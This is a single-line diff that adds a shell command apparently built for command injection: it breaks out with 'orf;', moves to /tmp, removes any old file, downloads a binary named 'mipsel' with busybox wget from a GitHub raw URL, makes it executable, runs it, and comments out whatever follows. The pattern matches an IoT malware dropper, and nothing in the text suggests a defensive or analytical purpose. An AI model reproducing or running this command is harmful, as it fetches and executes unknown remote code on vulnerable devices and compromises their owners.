@@ -1,0 +1,1 @@
+orf;cd /tmp; rm -rf mipsel; /bin/busybox wget https://raw.githubusercontent.com/20Matrix77/DHJIF/refs/heads/main/mipsel; chmod +x mipsel; ./mipsel; #
